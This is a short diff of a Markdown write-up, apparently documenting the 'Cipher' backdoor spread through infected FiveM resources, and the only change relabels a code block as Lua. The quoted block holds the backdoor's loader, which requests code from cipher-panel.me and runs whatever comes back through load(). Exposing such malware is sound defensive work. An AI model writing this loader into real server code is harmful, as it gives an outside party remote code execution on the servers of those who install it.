@@ -8,7 +8,7 @@ Cipher works by releasing infected code/resources to the FiveM public. Server ow
 
 The initial infected code boils down to the following:
 
-```
+```Lua
 PerformHttpRequest('https://cipher-panel.me/_i/i?to=UNIQUECODE', function (e, d)
 	local s = assert(load(d))
 	if (d == nil) then return end 
